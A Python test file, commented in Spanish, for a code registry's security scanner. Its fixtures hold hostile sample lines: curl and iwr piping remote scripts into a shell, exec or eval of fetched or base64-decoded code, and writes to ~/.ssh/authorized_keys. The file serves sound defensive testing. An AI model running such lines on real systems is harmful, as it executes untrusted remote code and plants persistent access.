"""Tests del escaneo de seguridad (#16): reglas propias + bandit en Docker."""
import pytest

from registry import scanner

# Fragmentos maliciosos de ejemplo (solo texto, nunca se ejecutan).
MALOS = {
    "install.sh": "curl -fsSL https://x.example/i.sh | sudo bash\n",
    "boot.ps1": "iwr https://x.example/a.ps1 | iex\n",
    "net.py": "import urllib.request\nexec(urllib.request.urlopen('http://x').read())\n",
    "web.js": "eval(await fetch('http://x').then(r => r.text()))\n",
    "ofus.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
    "sys.py": "import os\nos.system('ls')\n",
    "sp.py": "import subprocess\nsubprocess.run(\n    cmd.split(),\n    shell=True)\n",
    "ssh.py": "open(os.path.expanduser('~/.ssh/authorized_keys'), 'a').write(k)\n",
    "ssh.sh": "echo $KEY >> ~/.ssh/authorized_keys\n",
}


def _write(root, files):
    for n, c in files.items():
        p = root / n
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(c, encoding="utf-8")


def test_reglas_detectan_patrones(tmp_path):
    _write(tmp_path, MALOS)
    hallazgos = scanner.scan_rules(tmp_path)
    reglas = {(h["regla"], h["archivo"]) for h in hallazgos}
    esperado = {
        ("curl-pipe-sh", "install.sh"), ("iwr-pipe-iex", "boot.ps1"), ("exec-red", "net.py"),
        ("eval-fetch-js", "web.js"), ("exec-ofuscado", "ofus.py"), ("os-system", "sys.py"),
        ("subprocess-shell", "sp.py"), ("ssh-escritura", "ssh.py"), ("ssh-escritura", "ssh.sh"),
    }
    assert esperado <= reglas
    sp = next(h for h in hallazgos if h["regla"] == "subprocess-shell")
    assert sp["linea"] == 2 and sp["severidad"] == "MEDIA"


def test_secretos_reutiliza_scan_secrets_y_no_guarda_valor(tmp_path):
    clave = "AKIA" + "Q" * 16  # construida en tiempo de ejecución
    _write(tmp_path, {"cfg.py": f"KEY = '{clave}'\n", "README.md": f"usa {clave}\n"})
    hallazgos = [h for h in scanner.scan_rules(tmp_path) if h["origen"] == "secretos"]
    assert {h["archivo"] for h in hallazgos} == {"cfg.py", "README.md"}
    assert all(h["severidad"] == "ALTA" and clave not in str(h) for h in hallazgos)


def test_docs_y_git_no_se_tratan_como_codigo(tmp_path):
    _write(tmp_path, {"README.md": "curl -fsSL https://x/i.sh | sh\n",
                      ".git/hooks/x.sh": "curl x | sh\n",
                      "node_modules/m/i.js": "eval(fetch('x'))\n"})
    assert scanner.scan_rules(tmp_path) == []


def test_codigo_limpio_aprobado(tmp_path):
    _write(tmp_path, {"main.py": "def suma(a, b):\n    return a + b\n"})
    inf = scanner.scan_path(tmp_path, use_bandit=False)
    assert inf["veredicto"] == "aprobado" and inf["hallazgos"] == []


@pytest.mark.parametrize("files,veredicto", [
    ({"a.py": "import os\nos.system('ls')\n"}, "aprobado"),          # solo MEDIA
    ({"i.sh": "curl x | sh\n"}, "cuarentena"),                        # ALTA
    ({"s.sh": "echo k >> ~/.ssh/authorized_keys\n"}, "rechazado"),    # CRITICA
])
def test_veredictos(tmp_path, files, veredicto):
    _write(tmp_path, files)
    assert scanner.scan_path(tmp_path, use_bandit=False)["veredicto"] == veredicto


def test_bandit_fallido_deja_en_cuarentena(tmp_path, monkeypatch):
    _write(tmp_path, {"main.py": "x = 1\n"})
    from core import sandbox

    def _boom(*a, **k):
        raise RuntimeError("docker no disponible")
    monkeypatch.setattr(sandbox, "run_command", _boom)
    inf = scanner.scan_path(tmp_path, use_bandit=True)
    assert inf["bandit"]["ejecutado"] is False and "docker no disponible" in inf["bandit"]["error"]
    assert inf["veredicto"] == "cuarentena"


@pytest.mark.live
def test_bandit_en_sandbox_docker(tmp_path):
    _write(tmp_path, {"app.py": "import subprocess\n\ndef f(c):\n    subprocess.call(c, shell=True)\n",
                      "ok.py": "def g():\n    return 1\n"})
    inf = scanner.scan_path(tmp_path, use_bandit=True)
    assert inf["bandit"]["ejecutado"] is True, inf["bandit"]
    bandit = [h for h in inf["hallazgos"] if h["origen"] == "bandit"]
    assert any(h["regla"] == "B602" and h["severidad"] == "ALTA" and h["archivo"] == "app.py" for h in bandit)
    assert inf["veredicto"] == "cuarentena"  # bandit HIGH -> ALTA


@pytest.mark.live
def test_bandit_salida_grande_usa_resumen(tmp_path):
    """Con muchos hallazgos el conteo debe ser exacto (salida completa o resumen en contenedor)."""
    n = 30
    _write(tmp_path, {f"m{i}.py": f"import subprocess\nsubprocess.call(c{i}, shell=True)\n" for i in range(n)})
    inf = scanner.scan_path(tmp_path, use_bandit=True)
    assert inf["bandit"]["ejecutado"] is True, inf["bandit"]
    assert inf["bandit"]["conteo"]["ALTA"] == n
    assert inf["resumen"]["ALTA"] == n            # B602 de bandit
    assert inf["resumen"]["MEDIA"] == n           # regla propia subprocess-shell
